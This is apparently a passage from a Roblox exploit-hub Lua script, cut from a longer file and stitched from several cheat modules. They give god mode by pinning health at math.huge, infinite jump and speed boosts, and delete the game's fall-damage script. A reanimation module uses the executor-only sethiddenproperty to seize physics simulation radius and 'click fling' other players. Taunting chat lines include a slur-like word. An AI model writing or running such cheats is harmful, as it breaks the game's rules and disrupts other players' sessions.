script:WaitForChild("Heartbeat")

frame = 0.016666666666666666

tf = 0

allowframeloss = false

tossremainder = false

lastframe = tick()

script.Heartbeat:Fire()

game:GetService("RunService").Heartbeat:connect(function(s, p)

	tf = tf + s

	if tf >= frame then

		if allowframeloss then

			script.Heartbeat:Fire()

			lastframe = tick()

		else

			for i = 1, math.floor(tf / frame) do

				script.Heartbeat:Fire()

			end

			lastframe = tick()

		end

		if tossremainder then

			tf = 0

		else

			tf = tf - frame * math.floor(tf / frame)

		end

	end

end)

function swait(num)

	if num == 0 or num == nil then

		ArtificialHB.Event:wait()

	else

		for i = 0, num do

			ArtificialHB.Event:wait()

		end

	end

end

mouse.KeyDown:connect(function(key)

	if key == "c" then

		repeat

			swait()

			Chillmusic.Volume = Chillmusic.Volume - 0.05

		until Chillmusic.Volume == 0

		Chillmusic:Stop()

		swait()

		Chillmusic2:Play()

		Chillmusic.Volume = 1

	end

end)

mouse.KeyDown:connect(function(key)

	if key == "f" then

		text.Text = "Guys why not just chill?"

		wait(1)

		text.Text = "It's just the way life should be."

		wait(1)

		text.Text = "Chill is life."

		wait(1)

		text.Text = "Chill is love."

		wait(1)

		text.Text = "Chill is for the best."

		wait(1)

		text.Text = "Maybe if you were chill you wouldn't be a skid..."

		wait(3)

		text.Text = "But some people cant handle the chill can they."

		wait(3)

		text.Text = "Chill Af"

	end

end)

mouse.KeyDown:connect(function(key)

	if key == "v" then

		repeat

			swait()

			Chillmusic2.Volume = Chillmusic2.Volume - 0.05

		until Chillmusic2.Volume == 0

		Chillmusic2:Stop()

		swait()

		Chillmusic:Play()

		Chillmusic2.Volume = 1

	end

end)

mouse.KeyDown:connect(function(key)

	if key == "b" then

		text.Text = "Be back scrubs."

		wait(1)

		text.Text = "Afk nibba..."

	end

end)

mouse.KeyDown:connect(function(key)

	if key == "n" then

		text.Text = "K back you nubs's!"

		wait(1)

		text.Text = "Chill Af"

	end

end)

m = Instance.new("ForceField", Character)

m.Visible = false

Character.Humanoid.WalkSpeed = 4

mouse.KeyDown:connect(function(key)

	if string.byte(key) == 48 then

		Swing = 2

		Character.Humanoid.WalkSpeed = 40

	end

end)

mouse.KeyUp:connect(function(key)

	if string.byte(key) == 48 then

		Swing = 1

		Character.Humanoid.WalkSpeed = 4

	end

end)

local sine = 0

local change = 1

local val = 0

spawn(function()

while true do

	swait()

	sine = sine + change

	local torvel = (RootPart.Velocity * Vector3.new(1, 0, 1)).magnitude

	local velderp = RootPart.Velocity.y

	hitfloor, posfloor = rayCast(RootPart.Position, CFrame.new(RootPart.Position, RootPart.Position - Vector3.new(0, 1, 0)).lookVector, 4, Character)

	if equipped == true or equipped == false then

		if attack == false then

			idle = idle + 1

			Character.Humanoid.MaxHealth = math.huge

			Character.Humanoid.Health = math.huge

		else

			idle = 0

		end

		if not (idle >= 500) or attack == false then

		end

		if torvel < 1 and hitfloor ~= nil then

			Anim = "Chill"

			if attack == false then

				Humanoid.CameraOffset = Vector3.new(0, 10.25 - 5.45 * math.cos(sine / 65), 0)

				Torso.Weld.C0 = clerp(Torso.Weld.C0, CFrame.new(0, 10.25 - 5.45 * math.cos(sine / 65), 0) * CFrame.Angles(math.rad(90 + 15 * math.sin(sine / 60)), math.rad(0), math.rad(0)), 0.8)

				Torso.Neck.C0 = clerp(Torso.Neck.C0, necko * angles(math.rad(-20 + 20 * math.cos(sine / 60)), math.rad(0 + 4 * math.sin(sine / 60)), math.rad(0)), 0.2)

				RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(-90 + 25 * math.cos(sine / 60)), math.rad(0 + 20 * math.sin(sine / 60)), math.rad(0 + 55 * math.sin(sine / 60))), 0.3)

				LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(-90 + 25 * math.cos(sine / 60)), math.rad(-20 - 20 * math.sin(sine / 60)), math.rad(0 - 55 * math.sin(sine / 60))), 0.3)

				LeftLeg.Weld.C0 = clerp(LeftLeg.Weld.C0, CFrame.new(-0.5, -0.86 + 0.03 * math.cos(sine / 65), -0.4) * CFrame.Angles(math.rad(15 - 45 * math.cos(sine / 70)), math.rad(3), math.rad(-4)), 0.8)

				RightLeg.Weld.C0 = clerp(RightLeg.Weld.C0, CFrame.new(0.5, -1 + 0.05 * math.cos(sine / 65), -0.4) * CFrame.Angles(math.rad(15 - 35 * math.cos(sine / 65)), math.rad(-3), math.rad(4)), 0.8)

			end

		elseif torvel > 2 and torvel < 22 and hitfloor ~= nil then

			Anim = "Walk"

			if attack == false then

				Humanoid.CameraOffset = Vector3.new(0, 6 - 2.55 * math.cos(sine / 48.5), 0)

				RootJoint.C0 = clerp(RootJoint.C0, RootCF * cf(0, 0, 0) * angles(math.rad(5), math.rad(0), math.rad(0)), 0.2)

				Torso.Weld.C0 = clerp(Torso.Weld.C0, CFrame.new(0, 6 - 2.55 * math.cos(sine / 48.5), 0) * CFrame.Angles(math.rad(-90 + 5 * math.cos(sine / 45)), math.rad(180 * math.cos(sine / 48.5)), math.rad(0)), 0.8)

				Torso.Neck.C0 = clerp(Torso.Neck.C0, necko * angles(math.rad(-4 + 2 * math.sin(sine / 48)), math.rad(0), math.rad(0)), 0.2)

				RW.C0 = clerp(RW.C0, cf(1.5, 0.5 + 0.1 * math.cos(sine / 45), 0) * angles(math.rad(90), math.rad(0), math.rad(90 - 20.5 * math.cos(sine / 45))), 0.3)

				LW.C0 = clerp(LW.C0, cf(-1.5, 0.5 + 0.1 * math.cos(sine / 45), 0) * angles(math.rad(90), math.rad(0), math.rad(-90 + 20.5 * math.cos(sine / 45))), 0.3)

				LeftLeg.Weld.C0 = clerp(LeftLeg.Weld.C0, CFrame.new(-0.5, -1 - 0.05 * math.cos(sine / 45), 0) * CFrame.Angles(math.rad(0), math.rad(3), math.rad(-4)), 0.8)

				RightLeg.Weld.C0 = clerp(RightLeg.Weld.C0, CFrame.new(0.5, -1 + 0.05 * math.cos(sine / 45), 0) * CFrame.Angles(math.rad(0), math.rad(-3), math.rad(4)), 0.8)

			end

		elseif torvel >= 22 and hitfloor ~= nil then

			Anim = "Run"

			if attack == false then

				Humanoid.CameraOffset = Vector3.new(0, 6 - 1.55 * math.cos(sine / 68.5), 0)

				RootJoint.C0 = clerp(RootJoint.C0, RootCF * cf(0, 6 - 1.55 * math.cos(sine / 68.5), -0.2) * angles(math.rad(50), math.rad(0), math.rad(0)), 0.2)

				Torso.Weld.C0 = clerp(Torso.Weld.C0, CFrame.new(0, 6 - 1.55 * math.cos(sine / 68.5), 0) * CFrame.Angles(math.rad(-40 + 20 * math.sin(sine / 68.5)), 0, 0), 0.8)

				Torso.Neck.C0 = clerp(Torso.Neck.C0, necko * angles(math.rad(-12 + 17 * math.cos(sine / 68.5)), math.rad(0), math.rad(0)), 0.2)

				RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(-90), math.rad(0), math.rad(40 - 20 * math.cos(sine / 68.5))), 0.2)

				LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(-90), math.rad(0), math.rad(-40 + 20 * math.cos(sine / 68.5))), 0.2)

				LeftLeg.Weld.C0 = clerp(LeftLeg.Weld.C0, CFrame.new(-0.5, -0.87, -0.25) * CFrame.Angles(math.rad(-45 - 10 * math.cos(sine / 68.5)), math.rad(0), math.rad(0)), 0.8)

				RightLeg.Weld.C0 = clerp(RightLeg.Weld.C0, CFrame.new(0.5, -1, -0.1) * CFrame.Angles(math.rad(-35 - 10 * math.cos(sine / 68.5)), math.rad(0), math.rad(0)), 0.8)

			end

		end

	end

end

end)







-- Objects



local Chill_Gui_Bro = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)

local Header = Instance.new("Frame")

local BackGround = Instance.new("Frame")

local Chill_Gui_Label = Instance.new("TextLabel")

local Play_ID_Button = Instance.new("TextButton")

local ID_Box = Instance.new("TextBox")

local Set_Vol_Button = Instance.new("TextButton")

local Vol_Box = Instance.new("TextBox")

local Set_Tpos_Button = Instance.new("TextButton")

local Tpos_Box = Instance.new("TextBox")

local Set_Text_Button = Instance.new("TextButton")

local Tpos_Box_2 = Instance.new("TextBox")

local Toggle_Chat_Button = Instance.new("TextButton")

local Chat_Toggle_Label = Instance.new("TextLabel")

local Current_Song_Label = Instance.new("TextLabel")



-- Properties



Chill_Gui_Bro.Name = "Chill_Gui_Bro"



Header.Name = "Header"

Header.Parent = Chill_Gui_Bro

Header.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Header.BorderSizePixel = 0

Header.Draggable = true

Header.Active = true

Header.Selectable = true

Header.Position = UDim2.new(0.469539374, 0, 0.147921771, 0)

Header.Size = UDim2.new(0, 250, 0, 45)



BackGround.Name = "BackGround"

BackGround.Parent = Header

BackGround.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)

BackGround.BorderSizePixel = 0

BackGround.Draggable = true

BackGround.Position = UDim2.new(0, 0, 1, 0)

BackGround.Size = UDim2.new(0, 250, 0, 299)



Chill_Gui_Label.Name = "Chill_Gui_Label"

Chill_Gui_Label.Parent = Header

Chill_Gui_Label.BackgroundColor3 = Color3.new(1, 1, 1)

Chill_Gui_Label.BackgroundTransparency = 1

Chill_Gui_Label.BorderSizePixel = 0

Chill_Gui_Label.Draggable = true

Chill_Gui_Label.Size = UDim2.new(0, 250, 0, 45)

Chill_Gui_Label.Font = Enum.Font.Arcade

Chill_Gui_Label.Text = "~»Chill Gui«~"

Chill_Gui_Label.TextColor3 = Color3.new(1, 1, 1)

Chill_Gui_Label.TextScaled = true

Chill_Gui_Label.TextSize = 14

Chill_Gui_Label.TextWrapped = true



Play_ID_Button.Name = "Play_ID_Button"

Play_ID_Button.Parent = Header

Play_ID_Button.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Play_ID_Button.BorderColor3 = Color3.new(0, 0, 0)

Play_ID_Button.BorderSizePixel = 0

Play_ID_Button.Position = UDim2.new(0.0520000011, 0, 1.22222221, 0)

Play_ID_Button.Size = UDim2.new(0, 68, 0, 35)

Play_ID_Button.Font = Enum.Font.Arcade

Play_ID_Button.Text = "Play ID"

Play_ID_Button.TextColor3 = Color3.new(1, 1, 1)

Play_ID_Button.TextSize = 20

Play_ID_Button.TextWrapped = true



ID_Box.Name = "ID_Box"

ID_Box.Parent = Header

ID_Box.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

ID_Box.BorderColor3 = Color3.new(0, 0, 0)

ID_Box.BorderSizePixel = 0

ID_Box.Position = UDim2.new(0.356000006, 0, 1.22222221, 0)

ID_Box.Size = UDim2.new(0, 140, 0, 35)

ID_Box.Font = Enum.Font.Arcade

ID_Box.Text = "ID here"

ID_Box.TextColor3 = Color3.new(1, 1, 1)

ID_Box.TextSize = 35

ID_Box.TextWrapped = true



Set_Vol_Button.Name = "Set_Vol_Button"

Set_Vol_Button.Parent = Header

Set_Vol_Button.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Set_Vol_Button.BorderColor3 = Color3.new(0, 0, 0)

Set_Vol_Button.BorderSizePixel = 0

Set_Vol_Button.Position = UDim2.new(0.0520000011, 0, 2.20000005, 0)

Set_Vol_Button.Size = UDim2.new(0, 68, 0, 35)

Set_Vol_Button.Font = Enum.Font.Arcade

Set_Vol_Button.Text = "Set Vol"

Set_Vol_Button.TextColor3 = Color3.new(1, 1, 1)

Set_Vol_Button.TextSize = 20

Set_Vol_Button.TextWrapped = true



Vol_Box.Name = "Vol_Box"

Vol_Box.Parent = Header

Vol_Box.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Vol_Box.BorderColor3 = Color3.new(0, 0, 0)

Vol_Box.BorderSizePixel = 0

Vol_Box.Position = UDim2.new(0.356000006, 0, 2.20000005, 0)

Vol_Box.Size = UDim2.new(0, 140, 0, 35)

Vol_Box.Font = Enum.Font.Arcade

Vol_Box.Text = "Volume"

Vol_Box.TextColor3 = Color3.new(1, 1, 1)

Vol_Box.TextSize = 35

Vol_Box.TextWrapped = true



Set_Tpos_Button.Name = "Set_Tpos_Button"

Set_Tpos_Button.Parent = Header

Set_Tpos_Button.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Set_Tpos_Button.BorderColor3 = Color3.new(0, 0, 0)

Set_Tpos_Button.BorderSizePixel = 0

Set_Tpos_Button.Position = UDim2.new(0.0520000011, 0, 3.24444437, 0)

Set_Tpos_Button.Size = UDim2.new(0, 68, 0, 35)

Set_Tpos_Button.Font = Enum.Font.Arcade

Set_Tpos_Button.Text = "Set Tpos"

Set_Tpos_Button.TextColor3 = Color3.new(1, 1, 1)

Set_Tpos_Button.TextSize = 18

Set_Tpos_Button.TextWrapped = true



Tpos_Box.Name = "Tpos_Box"

Tpos_Box.Parent = Header

Tpos_Box.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Tpos_Box.BorderColor3 = Color3.new(0, 0, 0)

Tpos_Box.BorderSizePixel = 0

Tpos_Box.Position = UDim2.new(0.356000006, 0, 3.24444437, 0)

Tpos_Box.Size = UDim2.new(0, 140, 0, 35)

Tpos_Box.Font = Enum.Font.Arcade

Tpos_Box.Text = "Time Position"

Tpos_Box.TextColor3 = Color3.new(1, 1, 1)

Tpos_Box.TextSize = 20

Tpos_Box.TextWrapped = true



Set_Text_Button.Name = "Set_Text_Button"

Set_Text_Button.Parent = Header

Set_Text_Button.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Set_Text_Button.BorderColor3 = Color3.new(0, 0, 0)

Set_Text_Button.BorderSizePixel = 0

Set_Text_Button.Position = UDim2.new(0.0600000024, 0, 4.22222233, 0)

Set_Text_Button.Size = UDim2.new(0, 68, 0, 35)

Set_Text_Button.Font = Enum.Font.Arcade

Set_Text_Button.Text = "Set Text"

Set_Text_Button.TextColor3 = Color3.new(1, 1, 1)

Set_Text_Button.TextSize = 18

Set_Text_Button.TextWrapped = true



Tpos_Box_2.Name = "Tpos_Box"

Tpos_Box_2.Parent = Header

Tpos_Box_2.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Tpos_Box_2.BorderColor3 = Color3.new(0, 0, 0)

Tpos_Box_2.BorderSizePixel = 0

Tpos_Box_2.Position = UDim2.new(0.356000006, 0, 4.22222233, 0)

Tpos_Box_2.Size = UDim2.new(0, 140, 0, 35)

Tpos_Box_2.Font = Enum.Font.Arcade

Tpos_Box_2.Text = "Text"

Tpos_Box_2.TextColor3 = Color3.new(1, 1, 1)

Tpos_Box_2.TextSize = 20

Tpos_Box_2.TextWrapped = true



Toggle_Chat_Button.Name = "Toggle_Chat_Button"

Toggle_Chat_Button.Parent = Header

Toggle_Chat_Button.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)

Toggle_Chat_Button.BorderColor3 = Color3.new(0, 0, 0)

Toggle_Chat_Button.BorderSizePixel = 0

Toggle_Chat_Button.Position = UDim2.new(0.0579999983, 0, 5.26666689, 0)

Toggle_Chat_Button.Size = UDim2.new(0, 97, 0, 35)

Toggle_Chat_Button.Font = Enum.Font.Arcade

Toggle_Chat_Button.Text = "Toggle Chat"

Toggle_Chat_Button.TextColor3 = Color3.new(1, 1, 1)

Toggle_Chat_Button.TextSize = 20

Toggle_Chat_Button.TextWrapped = true



Chat_Toggle_Label.Name = "Chat_Toggle_Label"

Chat_Toggle_Label.Parent = Header

Chat_Toggle_Label.BackgroundColor3 = Color3.new(1, 1, 1)

Chat_Toggle_Label.BackgroundTransparency = 0.89999997615814

Chat_Toggle_Label.BorderColor3 = Color3.new(1, 1, 1)

Chat_Toggle_Label.Position = UDim2.new(0.540000021, 0, 5.26666689, 0)

Chat_Toggle_Label.Size = UDim2.new(0, 94, 0, 35)

Chat_Toggle_Label.Font = Enum.Font.Arcade

Chat_Toggle_Label.Text = "~»False«~"

Chat_Toggle_Label.TextColor3 = Color3.new(1, 1, 1)

Chat_Toggle_Label.TextScaled = true

Chat_Toggle_Label.TextSize = 14

Chat_Toggle_Label.TextWrapped = true



Current_Song_Label.Name = "Current_Song_Label"

Current_Song_Label.Parent = Header

Current_Song_Label.BackgroundColor3 = Color3.new(1, 1, 1)

Current_Song_Label.BackgroundTransparency = 0.89999997615814

Current_Song_Label.BorderColor3 = Color3.new(1, 1, 1)

Current_Song_Label.Position = UDim2.new(0.0520000011, 0, 6.64444447, 0)

Current_Song_Label.Size = UDim2.new(0, 225, 0, 35)

Current_Song_Label.Font = Enum.Font.Arcade

Current_Song_Label.Text = "~»Current Song: None«~"

Current_Song_Label.TextColor3 = Color3.new(1, 1, 1)

Current_Song_Label.TextScaled = true

Current_Song_Label.TextSize = 14

Current_Song_Label.TextWrapped = true



Play_ID_Button.MouseButton1Down:Connect(function()

if tonumber(ID_Box.Text) then

	Chillmusic:Stop()

	Chillmusic.SoundId='rbxassetid://'..tonumber(ID_Box.Text)

	Chillmusic:Play()

	currentsong = game:GetService("MarketplaceService"):GetProductInfo(tonumber(ID_Box.Text)).Name

	text.Text = "~»Chill Af«~ Now Playing: "..currentsong

	Current_Song_Label.Text = "~»Current Song: "..currentsong.."«~"

wait(4)

text.Text = "~»Fell Apart AF«~"

end

end)

local ischatting = false



Set_Vol_Button.MouseButton1Down:Connect(function()



	Chillmusic.Volume = tonumber(Vol_Box.Text)

end)



Set_Tpos_Button.MouseButton1Down:Connect(function()



	Chillmusic.TimePosition = tonumber(Tpos_Box.Text)

end)



Set_Text_Button.MouseButton1Down:Connect(function()



	text.Text = "~»"..Tpos_Box_2.Text.."«~"

end)



Toggle_Chat_Button.MouseButton1Down:Connect(function()

if ischatting == false then

ischatting = true

Chat_Toggle_Label.Text = "~»True«~"

spawn(function()

game.Players.LocalPlayer.Chatted:connect(function(msg)

for i = 0, msg:len(), 1 do

	text.Text = "~»"..msg:sub(0, i).."«~"

end

wait(3)

text.Text = "~»Fell Apart AF«~"

end)

end)

else

ischatting = false

Chat_Toggle_Label.Text = "~»False«~"

end

end)
end)



Section:NewButton("Fe Mario Animation", "Its me mario", function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)

while true do
local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782845736"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782841498"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
Animate.run.RunAnim.AnimationId = 
"http://www.roblox.com/asset/?id=4417979645"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014411816"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=5319839762"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 29
game.Players.LocalPlayer.Character.FallDamageScript:Destroy()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 95
wait(1)
end
end)

Section:NewButton("CrazyMan(Need: Pal Hair)", "it like bacon hair", function()
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {} local te = table.insert local m = plr:GetMouse()  if char:FindFirstChild('Pal Hair') then else return end  _G.Jitter=Vector3.new(0,30,0)  for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") and v.Name ~= 'HumanoidRootPart' then  bf=Instance.new('BodyForce',v) bf.Force=Vector3.new(50,50,50) te(ct,game:GetService("RunService").Heartbeat:connect(function() pcall(function() v.Velocity = _G.Jitter v.BodyForce.Force=Vector3.new(50,50,50) game.Players.LocalPlayer.ReplicationFocus=workspace sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",9e9) end) end)) end end  char.Archivable = true fl=Instance.new('Folder',char) fl.Name = 'ArmFling' local reanim = char:Clone() char.Humanoid:ChangeState(16) char.HumanoidRootPart:Destroy()  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  hats=0 function create(part, parent, p, r) hats=hats+1 Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name..hats parent.Attachment.Name = part.Name..hats part.AlignPosition.Attachment0 = part[part.Name..hats] part.AlignOrientation.Attachment0 = part[part.Name..hats] part.AlignPosition.Attachment1 = parent[part.Name..hats] part.AlignOrientation.Attachment1 = parent[part.Name..hats] parent[part.Name..hats].Position = p or Vector3.new() part[part.Name..hats].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  function Pos(part, parent, p) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part.AlignPosition.MaxForce = 999999999*10 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false end  function nc(p) if p:IsA('BasePart') or p:IsA('Part') then te(ct,srv.Stepped:Connect(function() p.CanCollide=false end)) te(ct,srv.RenderStepped:Connect(function() p.CanCollide=false end)) else print('Cannot noclip '..p) end end  function af() for i,v in next, game.Players:GetDescendants() do if v:IsA('Player') and v.Name ~= game.Players.LocalPlayer.Name then for _,c in next, v.Character:GetDescendants() do if c:IsA('BasePart') and v.Parent== char then noo=Instance.new('NoCollisionConstraint',c) noo.Part1=char['Torso'] noo.Part0=c noo2=Instance.new('NoCollisionConstraint',c) noo2.Part1=char['Head'] noo2.Part0=c end end end end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') and v.Name ~= 'Pal Hair' then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then nc(v) end end  for i,v in next, char:GetDescendants() do if v:IsA('Motor6D') and v.Name ~= 'Neck' then v:Destroy() end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') and v.Name ~= 'Right Leg' and v.Name ~= 'Head' and v.Parent == char then create(v,reanim[v.Name]) end end  function flinger(p) f=Instance.new('BodyAngularVelocity',p) f.P=9e9*10 f.AngularVelocity = Vector3.new(9e9*10,9e9*10,9e9*10) f.MaxTorque=Vector3.new(9e9*10,0,0) return f end  Pos(char['Right Leg'],reanim['Torso']) fliiiin=flinger(char['Right Leg'])  char['Pal Hair'].Handle:BreakJoints() char['Pal Hair'].Handle.Mesh:Destroy()  create(char['Pal Hair'].Handle,reanim['Right Leg'],Vector3.new(),Vector3.new(90,0,0))  reanim.Animate.Disabled=true  reanim.Parent=fl  sh=false  fp=Instance.new('Part',reanim) fp.Name='FlingPart' fp.CanCollide=false fp.Transparency=1 if clickfling then te(ct,m.Button1Down:Connect(function() sh=true end))  te(ct,m.Button1Up:Connect(function() sh=false end)) end te(ct,srv.Heartbeat:Connect(function() m.TargetFilter=char if sh then fp.CFrame=CFrame.new(m.Hit.p) char['Right Leg'].Position=fp.Position else fp.CFrame=char.Torso.CFrame*CFrame.new(0,0,0) char['Right Leg'].Position=fp.Position end end))  plr.Character=reanim workspace.Camera.CameraSubject=reanim  HumanDied=false  te(ct,reanim.Humanoid.Died:Connect(function() HumanDied=true fliiiin:Destroy() reanim.HumanoidRootPart.Anchored=true old=reanim.HumanoidRootPart.CFrame reanim.HumanoidRootPart.CFrame=old wait() reanim.HumanoidRootPart.CFrame=old char.Humanoid:Destroy() Instance.new('Humanoid',char) plr.Character=char char:BreakJoints() game.Players:Chat('-gr') for i,v in next, ct do v:Disconnect() end end))

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = game.Players.LocalPlayer.Character

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end
m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == 'normal man' or Mode == 'Normal' then
if reanim.Humanoid.Jump then -- jump
--jump clerp here
elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
